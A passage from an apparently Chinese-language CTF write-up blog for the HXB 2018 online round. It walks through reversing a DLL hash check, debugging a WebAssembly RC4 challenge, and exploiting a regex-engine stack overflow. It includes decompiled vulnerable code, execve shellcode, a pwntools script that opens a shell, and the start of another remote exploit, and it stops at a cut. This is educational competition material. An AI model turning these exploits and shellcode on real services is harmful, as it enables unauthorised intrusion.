<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (__fastcall *highwayhash)(__int64 buff, <span class="type">unsigned</span> __int64 len);    <span class="comment">// 定义函数返回值类型以及参数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HMODULE hdll;</span><br><span class="line">    hdll = LoadLibrary(TEXT(<span class="string">&quot;C:\\Users\\lenovo\\Desktop\\reverse.dll&quot;</span>));    <span class="comment">// 加载 修改之后的程序</span></span><br><span class="line">    <span class="keyword">if</span>(hdll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load dll failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DLL base: %llx\n&quot;</span>,hdll);    <span class="comment">// dll 的基址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Solving length...\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> result;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">50</span>; len++)</span><br><span class="line">    &#123;</span><br><span class="line">        result = ((highwayhash)((PBYTE)hdll + <span class="number">0x17a0</span>))((<span class="type">long</span> <span class="type">long</span> )&amp;len, <span class="number">4</span>);    <span class="comment">// 调用函数 第一次爆破 flag 的长度</span></span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0xD31580A28DD8E6C4</span>)                                        <span class="comment">// 第一个参数是 4 字节的空间指针，第二个是长度</span></span><br><span class="line">        &#123;                                                                       <span class="comment">// 调用函数的格式一定要遵循这种标准</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]FOUND Length: %d\n&quot;</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Solving flag...\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">5299999999</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        sprintf_s(buff, <span class="string">&quot;%0.10llu&quot;</span>, i);    <span class="comment">// 由于传递的参数是一个指针，可以使用 sprintf 快速制作出符合要求的地址空间。</span></span><br><span class="line">        result = ((highwayhash)((PBYTE)hdll + <span class="number">0x17a0</span>))((<span class="type">long</span> <span class="type">long</span> )buff, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0x7CDCCF71350B7DB8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]FOUND: %s\n&quot;</span>, buff);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">100000</span> == <span class="number">0</span>)    <span class="comment">// 注意不要把每一个尝试的数字都输出，会导致 stdout 溢出无法显示后续结果。</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]Trying %0.10llu\n&quot;</span>, i);  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>另一个问题是编译参数，题目是 PE32+(64 位的 PE)，那我们自己写的外挂也需要是 64 位的，在 windows 上编译 64 位程序有许多办法，我去网上下载了 mingw64 ，安装到电脑上就可以把代码编译成 64 位程序。<br>编译选项：  <strong>g++ -m64 0.cpp -o test -O3</strong></p>
<p>由于已经知道了 flag 是多少，直接填写 5299999999 这个值，快速算出答案：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online6.png"
                      alt="image"
                ></p>
<p>和第一种做法得出的答案相同。</p>
<h3 id="3-More-efficient-than-JS"><a href="#3-More-efficient-than-JS" class="headerlink" title="3. More efficient than JS"></a>3. More efficient than JS</h3><p>这是一道 WASM 的逆向题目，之前是见过一次的，WASM 是 WebAssembly 编译格式编译出的二进制文件，这种编译格式可以将 C 或 C++ 代码编译成 wasm 文件，开发者可以用 JS 作为桥梁，在网页上直接应用这种二进制程序。</p>
<p>不过对于逆向这一方面，WASM 是一种很难看懂的东西，工具的静态分析效果不理想，而动态调试只能使用浏览器的控制台。<br>WebAssembly 本质是一个基于栈的虚拟机，所有的操作指令(针对操作数的)都可以被简化成 <strong>从栈上取值 –&gt; 进行运算 –&gt; 存回栈上</strong>，但实际上在调试题目的过程中，我们所面对的只有一堆指令和局部&#x2F;全局变量。  </p>
<p>打开浏览器，把 hello.html 拖到浏览器中，会直接打开题目页面并弹出一个 Input 窗口:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online8.png"
                      alt="image"
                ></p>
<p>flag 就要输入到这个窗口中，需要注意的是，任意输入一串字符，点击确定按钮之后它并不会消失，就算输入了正确的 flag，这个窗口也会一直存在，点击取消按钮窗口才会消失，我们直接按下F12开启控制台，在调试器一栏中能够找到 wasm:&#x2F;&#x2F; 这个目录，打开它并双击子目录中的文件，然后刷新页面，就能看到 wasm 的反汇编代码了，如果不小心误操作，刷新页面重置程序，点击代码之前的行号可以下断点，F10是单步步过，F11是单步步入。<br>我们直接切入正题，要想调试 wasm，首先要在 JS&#x2F;html 中定位 “驱动函数”，观察 html 代码没有找到调用函数的位置，那就去 js 里面找一找，直接搜索字符串 “Input:” 来定位函数位置。<br>找到以下代码：</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span> != <span class="string">&#x27;undefined&#x27;</span> &amp;&amp;</span><br><span class="line">          <span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">prompt</span> == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">          <span class="comment">// Browser.</span></span><br><span class="line">          result = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Input: &#x27;</span>);  <span class="comment">// returns null on cancel</span></span><br><span class="line">          <span class="keyword">if</span> (result !== <span class="literal">null</span>) &#123;</span><br><span class="line">            result += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></div>
<p>虽然找到了关键代码的位置，但是上下翻找并没有发现哪里调用了 wasm 中的函数，下断点跟踪看看也没什么结果，线索到这里似乎断掉了，查看了 wp 之后才发现，在 wasm 文件中存在一个名为 _main 的函数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(export &quot;_main&quot; (func $func24))</span><br></pre></td></tr></table></figure></div>
<p>这个应该就是主函数了，注意在 wasm 中函数名不再是明文标注，而是使用形如 funcxx 的格式，那么主函数就是 func24，直接搜索 func24 定位到主函数下断点，刷新页面，果然断下来。<br>接下来就可以开始单步调试了，主函数的代码并不复杂，这种代码看起来甚至要比真正的汇编简单</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(func $func24 (result i32)</span><br><span class="line">  (local $var0 i32) (local $var1 i32) (local $var2 i32) (local $var3 i32) (local $var4 i32) (local $var5 i32) (local $var6 i32) (local $var7 i32) (local $var8 i32) (local $var9 i32) (local $var10 i32) (local $var11 i32) (local $var12 i32)</span><br><span class="line">  get_global $global10</span><br><span class="line">  set_local $var12</span><br><span class="line">  get_global $global10</span><br><span class="line">  i32.const 256</span><br><span class="line">  i32.add</span><br><span class="line">  set_global $global10</span><br><span class="line">  get_global $global10</span><br><span class="line">  get_global $global11</span><br><span class="line">  i32.ge_s</span><br><span class="line">  if</span><br><span class="line">    i32.const 256</span><br><span class="line">    call $import3</span><br><span class="line">  end</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 240</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var10</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 232</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var9</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 224</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var8</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 216</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var7</span><br><span class="line">  get_local $var12</span><br><span class="line">  i32.const 112</span><br><span class="line">  i32.add</span><br><span class="line">  set_local $var1</span><br><span class="line">  get_local $var12</span><br><span class="line">  set_local $var2</span><br><span class="line">  i32.const 0</span><br><span class="line">  set_local $var0</span><br><span class="line">  i32.const 4447</span><br><span class="line">  get_local $var7</span><br><span class="line">  call $func97</span><br><span class="line">  drop</span><br><span class="line">  get_local $var8</span><br><span class="line">  get_local $var1</span><br><span class="line">  i32.store</span><br><span class="line">  i32.const 4472</span><br><span class="line">  get_local $var8</span><br><span class="line">  call $func98</span><br><span class="line">  drop</span><br><span class="line">  get_local $var1</span><br><span class="line">  call $func42</span><br><span class="line">  set_local $var3</span><br><span class="line">  i32.const 4475</span><br><span class="line">  i32.const 8</span><br><span class="line">  get_local $var1</span><br><span class="line">  get_local $var3</span><br><span class="line">  get_local $var2</span><br><span class="line">  call $func22</span><br><span class="line">  drop</span><br><span class="line">  get_local $var2</span><br><span class="line">  call $func23</span><br><span class="line">  set_local $var4</span><br><span class="line">  get_local $var4</span><br><span class="line">  i32.const 24</span><br><span class="line">  i32.shl</span><br><span class="line">  i32.const 24</span><br><span class="line">  i32.shr_s</span><br><span class="line">  i32.const 0</span><br><span class="line">  i32.ne</span><br><span class="line">  set_local $var5</span><br><span class="line">  get_local $var5</span><br><span class="line">  if</span><br><span class="line">    i32.const 4484</span><br><span class="line">    get_local $var9</span><br><span class="line">    call $func97</span><br><span class="line">    drop</span><br><span class="line">    get_local $var0</span><br><span class="line">    set_local $var6</span><br><span class="line">    get_local $var12</span><br><span class="line">    set_global $global10</span><br><span class="line">    get_local $var6</span><br><span class="line">    return</span><br><span class="line">  else</span><br><span class="line">    i32.const 4488</span><br><span class="line">    get_local $var10</span><br><span class="line">    call $func97</span><br><span class="line">    drop</span><br><span class="line">    get_local $var0</span><br><span class="line">    set_local $var6</span><br><span class="line">    get_local $var12</span><br><span class="line">    set_global $global10</span><br><span class="line">    get_local $var6</span><br><span class="line">    return</span><br><span class="line">  end</span><br><span class="line">  unreachable</span><br><span class="line">  i32.const 0</span><br><span class="line">  return</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>这道题整个调试过程涉及到的指令翻来覆去只有那么几个，比如 set_local 和 get_local，相当于汇编中的 mov ，i32.const 0，相当于掏出了一个立即数，call 自然是调用函数的意思，更详细的指令解释在<a class="link"   href="https://ithelp.ithome.com.tw/articles/10195837" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>单步调试，前面的 set&#x2F;get 执行了一些初始化操作，第一个遇到的函数是 $func97，步过它没有什么影响，第二个函数是 $func98，单步步过之后就会弹出 Input 提示框，那么这道题目的入口点可能是在 wasm 中，由 wasm 先执行一部分代码，然后将控制权转交给 JS ，JS 获取用户输入，然后再交换控制权给 wasm。<br>在提示框中输入一些内容，点击确定再点击取消，程序会断在 func98 的下一行。<br>接下来是 func42，这个函数步入分析一下，大致看一下内部结构有几个循环，查看函数的返回值时发现正好是输入的字符串的长度，比如<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online9.png"
                      alt="image"
                ></p>
<p>那么它应该就是 strlen 之类的求字符串长度的函数，直接步过，紧接着进入到本题的关键函数，func22。<br>首先可以看到函数的几个参数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online10.png"
                      alt="image"
                ><br>如果这样看不够明显的话，可以搜索 func22 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(func $func22 (param $var0 i32) (param $var1 i32) (param $var2 i32) (param $var3 i32) (param $var4 i32) (result i32)</span><br></pre></td></tr></table></figure></div>
<p>很明显的看到函数接收 5 个参数，并返回一个值。<br>通过 call 上方的五个取值语句，容易分析出它们都是什么，4475 属于 wasm 的指针，我们依次点击右边的 <strong>Window:Global –&gt; HEAPU8:Uint8Array</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online11.png"
                      alt="image"
                ></p>
<p>这里会列出很多的区间，在里面找到 4475：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online12.png"
                      alt="image"
                ></p>
<p>将这几个十进制数转换成字符得到：”<strong>I_am_key</strong>“ ，猜测这就是加密算法的秘钥，之前的 8 也就是秘钥的长度，类似的，分析出后三个参数是 flag 、flag 的长度、一个空的数组。<br>步入 func22，单步分析这个函数，绝大部分的操作都是取值–运算–保存结果，真正一步运算是一个异或，其他的都是替换一些数据的位置等等。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online13.png"
                      alt="image"
                ></p>
<p>直接在这个异或下断点，输入的 flag 在 var39，程序内置的数据在 var33，两者异或然后保存到堆栈中。<br>当这个函数执行完成之后，回到主函数，下面还有最后一个重要函数 func23，同样的，通过单步调试发现是比较函数，关键点在于</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set_local $var7</span><br><span class="line">get_local $var3</span><br><span class="line">get_local $var7</span><br><span class="line">i32.ne</span><br><span class="line">set_local $var8</span><br><span class="line">get_local $var8</span><br></pre></td></tr></table></figure></div>
<p>将加密好的 flag 和内置的数据进行比较，如果完全匹配就成功。<br>简单的破解思路是在 func22 里面把和 flag 异或的数组取出来，然后在 func23 中取出目标数组，两者异或即可得到正确的 flag。<br>但是由于调试器的问题，我一直不能正常断在理想的位置，于是退而求其次，我们可以输入一串相同的字符，比如一串 0，然后直接在 func23 里面取出目标数组和加密之后的数组，将加密之后的数组先逐位异或字符 0，再和目标数组异或即可。<br>附上解密脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s_t = [<span class="number">137</span>, <span class="number">221</span>, <span class="number">46</span>, <span class="number">119</span>, <span class="number">76</span>, <span class="number">156</span>, <span class="number">92</span>, <span class="number">92</span>, <span class="number">137</span>, <span class="number">215</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">132</span>, <span class="number">233</span>, <span class="number">53</span>, <span class="number">206</span>, <span class="number">231</span>]</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s_t:</span><br><span class="line">    s.append(i ^ <span class="number">48</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">target = [<span class="number">223</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">32</span>, <span class="number">7</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">201</span>, <span class="number">158</span>, <span class="number">142</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">237</span>, <span class="number">120</span>, <span class="number">121</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="built_in">len</span>(target) - <span class="number">1</span>:</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[k] ^ target[k])</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p>flag : flag{happy_rc4}</p>
<p>原来是 rc4 算法，其实在代码中也能看见一些端倪。<br>实际上 webassembly 编译出来的 wasm 文件和一般的二进制类似，指令所实现的功能也大同小异，甚至从某种意义上讲，wasm 反汇编代码要更加简单一些，但是苦于没有较好的工具，逆向起来还是比较头痛的。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-Regex-Format"><a href="#1-Regex-Format" class="headerlink" title="1. Regex Format"></a>1. Regex Format</h3><p>题目模拟了一个正则表达式引擎，输入自定义的正则表达式和待匹配的字符串，程序返回正则匹配的结果。<br>先不去逆向逻辑，搜索字符串发现 “Before :use$ it, :understand$* it :first$+.”，这个应该是出题人给出的样例正则表达式，运行程序，不输入任何新的表达式，待匹配字符串设置为 “Before use it, understand it first.”，即可匹配成功，返回 “Before u it, understand it first.”。<br>结合真实的正则表达式猜测 冒号 和 美元符号 标识了匹配的范围， 星号 表示匹配零次或多次， 加号 表示匹配至少一次。<br>之后分析程序的逻辑，关键点在下面这段代码中</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v34; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = &amp;s;</span><br><span class="line">  v11 = &amp;unk_804A634 + <span class="number">100</span> * i;</span><br><span class="line">  v10 = v32;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v32 = sub_8048930(v11, &amp;v10[v2], v12);</span><br><span class="line">  <span class="keyword">if</span> ( v32 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcat</span>(&amp;dest, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>匹配函数就是 sub_8048930，传递的三个参数分别是一块空闲内存，输入的待匹配字符串，栈内存。而漏洞就出在这个 v12 上面。<br>进入匹配函数分析逻辑，结果和我们的猜测相同</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__cdecl <span class="title function_">sub_8048930</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [esp+1Fh] [ebp-29h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-24h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// [esp+28h] [ebp-20h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> v9; <span class="comment">// [esp+30h] [ebp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;:&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9 - <span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">1000</span>;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">1000</span>;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; v8 )</span><br><span class="line">        v4 = sub_80488B0(a1, a2[i]) != <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      a3[i] = a2[i];    <span class="comment">// 漏洞点</span></span><br><span class="line">    &#125;</span><br><span class="line">    a3[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt; v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[!]No match string\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = a2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strstr</span>(a2, a1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v5;</span><br><span class="line">      <span class="built_in">strcpy</span>(a3, a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[!]No match string\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意代码中匹配完成后，会尝试将匹配的结果放入栈上，由于栈上的变量 v12 长度只有 200，而我们可以输入的字符串长度为 1000，会导致栈溢出，控制返回地址，之后就是拿 shell 了。<br>先看一下程序开启的保护<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online14.png"
                      alt="image"
                ></p>
<p>啥也没开，利用就有很多方式了，我选择在 BSS 段上写一些 shellcode ，然后劫持返回地址到 shellcode 上面。  </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;47.94.194.131&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;format\n&quot;</span>)</span><br><span class="line">payload1 = <span class="string">&quot;:&quot;</span> + p32(<span class="number">0x0804a1fb</span>) + <span class="string">&quot;$*&quot;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;match\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;Before use it, understand it first.&quot;</span> + p32(<span class="number">0x0804a1fb</span>) * <span class="number">220</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[Y/n]\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;format\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;match\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;fuck you!&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[Y/n]\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>拿到 shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online15.png"
                      alt="image"
                ></p>
<h3 id="2-hash-burger"><a href="#2-hash-burger" class="headerlink" title="2. hash burger"></a>2. hash burger</h3><p>这道题是 SECCON 2017 的原题，涉及的技术是堆喷射，暂时没有研究。</p>
<p><a class="link"   href="https://github.com/SECCON/SECCON2017_online_CTF/tree/0a8bbd28544fbd89bed0f0e3eafa7b09a0165a6b/pwn/300_hash_burger" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CRC reverse module start.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A library with misc. data manipulation functions</span></span><br><span class="line"><span class="comment">#  (c) 2005 - Intrepid Software</span></span><br><span class="line"><span class="comment">#   Bas Westerbaan &lt;bas.westerbaan@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&#x27;TOO LONG&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># Exploit start. Merged files in convinience.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&#x27;47.107.237.73&#x27;</span>, <span class="number">8888</span></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"><span class="comment">#r = process(&quot;./challenge&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">key, value</span>):</span><br><span class="line">	menu_string=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">	r.sendline(menu_string)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">str</span>(value)[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;123456789&#x27;</span>:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	r.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collision</span>(<span class="params"><span class="built_in">hash</span>, prefix=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	crc = Crc32Provider()</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		crc.reset()</span><br><span class="line">		crc.update(prefix + <span class="built_in">str</span>(i))</span><br><span class="line">		<span class="keyword">yield</span> prefix + <span class="built_in">str</span>(i) + crc.patch(<span class="built_in">hash</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;with \&#x27;&#x27;</span>)</span><br><span class="line">prefix = r.recvuntil(<span class="string">&#x27;\&#x27;&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Generating POW&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    z = [prefix, <span class="literal">None</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            z[<span class="number">1</span>] = <span class="string">&#x27;%06x&#x27;</span> % i</span><br><span class="line">            <span class="keyword">if</span> sha1(<span class="string">&#x27;&#x27;</span>.join(z)).digest().startswith(<span class="string">&#x27;\x00&#x27;</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span>.join(z)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = generate(prefix)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;POW generated: %r&#x27;</span> % p[:<span class="number">100</span>]</span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># Vulnerability: HashMap OOB access for a large hash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span 